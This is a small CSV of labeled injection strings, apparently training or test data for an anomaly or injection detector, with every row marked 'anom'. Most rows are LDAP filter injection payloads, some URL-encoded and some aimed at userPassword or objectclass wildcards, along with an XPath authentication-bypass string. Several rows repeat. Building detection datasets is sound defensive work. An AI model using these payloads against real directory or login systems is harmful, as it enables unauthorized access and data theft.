payload,label
*,anom
*)(&,anom
*))%00,anom
*()|%26',anom
*()|&',anom
*(|(mail=*)),anom
*(|(objectclass=*)),anom
*)(uid=*))(|(uid=*,anom
*/*,anom
*|,anom
/,anom
//,anom
//*,anom
@*,anom
|,anom
admin*,anom
admin*)((|userpassword=*),anom
admin*)((|userPassword=*),anom
x' or name()='username' or 'x'='y,anom
!,anom
21%,anom
26%,anom
28%,anom
29%,anom
%2A%28%7C%28mail%3D%2A%29%29,anom
%2A%28%7C%28objectclass%3D%2A%29%29,anom
%2A%7C,anom
%7C,anom
&,anom
(,anom
),anom
)(cn=))\x00,anom
*(|(mail=*)),anom
*(|(objectclass=*)),anom
*/*,anom
*|,anom
/,anom
//,anom
//*,anom
@*,anom
x' or name()='username' or 'x'='y,anom
|,anom
*()|&',anom
admin*,anom
admin*)((|userpassword=*),anom
*)(uid=*))(|(uid=*,anom
